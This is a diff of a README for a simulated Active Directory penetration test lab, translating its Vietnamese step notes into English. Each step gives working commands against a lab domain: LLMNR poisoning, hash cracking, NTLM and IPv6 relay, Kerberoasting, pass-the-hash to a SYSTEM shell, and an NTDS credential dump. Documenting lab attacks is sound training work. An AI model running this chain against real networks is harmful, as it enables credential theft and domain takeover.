@@ -13,23 +13,19 @@ Simulated Active Directory penetration test demonstrating common attack techniqu
 
 ### 1. Initial Access
 
-**LLMNR/MDNS Poisoning** — Responder lắng nghe và bắt NTLMv2 hash khi victim kết nối sai tên host.
+**LLMNR/MDNS Poisoning** — Responder listens on the network and captures NTLMv2 hashes when a victim attempts to resolve a non-existent hostname.
 ```bash
 sudo responder -I eth0 -dwv
 ```
 ![LLMNR Poisoning](Screenshots/01-llmnr-poisoning.png)
 
----
-
-**Hash Cracking** — Dùng Hashcat với wordlist rockyou.txt để crack NTLMv2 hash thành plaintext.
+**Hash Cracking** — Captured NTLMv2 hash cracked offline using Hashcat with rockyou.txt wordlist.
 ```bash
 hashcat -m 5600 hashes.txt /usr/share/wordlists/rockyou.txt
 ```
 ![Hash Cracked](Screenshots/02-hash-cracked.png)
 
----
-
-**SMB Relay Attack** — Relay NTLM authentication sang máy khác để dump SAM hashes.
+**SMB Relay Attack** — Instead of cracking, relay the captured NTLM authentication to another machine to dump SAM hashes.
 ```bash
 sudo ntlmrelayx.py -tf target_relay.txt -smb2support -i
 ```
@@ -40,54 +36,52 @@ sudo ntlmrelayx.py -tf target_relay.txt -smb2support -i
 
 ### 2. Post-Exploitation / Lateral Movement
 
-**IPv6 Attack (mitm6)** — Giả mạo DNS IPv6 để relay authentication lên LDAPS, tạo user mới với DCSync rights.
+**IPv6 Attack (mitm6)** — Abuse IPv6 DNS to perform a man-in-the-middle attack, relay authentication over LDAPS to create a new user with DCSync privileges.
 ```bash
 sudo mitm6 -d giahuy.local --ignore-nofqdn -i eth0
 sudo ntlmrelayx.py -6 -t ldaps://192.168.100.131 -wh fakewpad.giahuy.local -l loot
 ```
 ![mitm6 Setup](Screenshots/05-ipv6-mitm6-setup.png)
-![mitm6 Relay](Screenshots/06-ipv6-mitm6-relay.png)
+![mitm6 Relay - DCSync Rights Granted](Screenshots/06-ipv6-mitm6-relay.png)
 
 ---
 
 ### 3. Enumeration
 
-**BloodHound** — Collect và visualize AD relationships, tìm attack path lên Domain Admin.
+**BloodHound** — Collect AD data and visualize relationships to identify attack paths to Domain Admin.
 ```bash
 sudo bloodhound-python -d giahuy.local -u thanhthao -p 'Welcome1' -ns 192.168.100.131 -c all
 ```
 ![BloodHound Overview](Screenshots/07-bloodhound-overview.png)
-![BloodHound Path to DA](Screenshots/08-bloodhound-path-to-da.png)
+![BloodHound Path to Domain Admin](Screenshots/08-bloodhound-path-to-da.png)
 
 ---
 
 ### 4. Privilege Escalation
 
-**Kerberoasting** — Request TGS ticket cho service account rồi crack offline.
+**Kerberoasting** — Request TGS tickets for service accounts and crack them offline to obtain plaintext passwords.
 ```bash
 sudo GetUserSPNs.py giahuy.local/thanhthao:'Welcome1' -dc-ip 192.168.100.131 -request
 hashcat -m 13100 kerberoast.txt /usr/share/wordlists/rockyou.txt
 ```
-![Kerberoasting SPN](Screenshots/09-kerberoasting-spn.png)
-![Kerberoasting Cracked](Screenshots/10-kerberoasting-cracked.png)
+![Kerberoasting - SPN Found](Screenshots/09-kerberoasting-spn.png)
+![Kerberoasting - Password Cracked](Screenshots/10-kerberoasting-cracked.png)
 
----
-
-**Pass-the-Hash** — Dùng NTLM hash để authenticate không cần plaintext password, đạt SYSTEM shell.
+**Pass-the-Hash** — Use the dumped NTLM hash to authenticate without knowing the plaintext password, achieving a SYSTEM shell.
 ```bash
-smbexec.py Administrator@192.168.100.13 -hashes aad3b435b51404eeaad3b435b51404ee:<hash>
+smbexec.py Administrator@192.168.100.13 -hashes aad3b435b51404eeaad3b435b51404ee:<NT_HASH>
 ```
-![Pass-the-Hash Shell](Screenshots/11-pass-the-hash-shell.png)
+![Pass-the-Hash - SYSTEM Shell](Screenshots/11-pass-the-hash-shell.png)
 
 ---
 
 ### 5. Domain Compromise
 
-**NTDS.dit Dump** — Dump toàn bộ domain credentials từ Domain Controller.
+**NTDS.dit Dump** — Full domain credential dump from the Domain Controller using DCSync.
 ```bash
 secretsdump.py giahuy.local/Administrator@192.168.100.131 -hashes <hash>
 ```
-![NTDS Dump](Screenshots/12-ntds-dump.png)
+![NTDS Dump - Full Domain Credentials](Screenshots/12-ntds-dump.png)
 
 ---
 
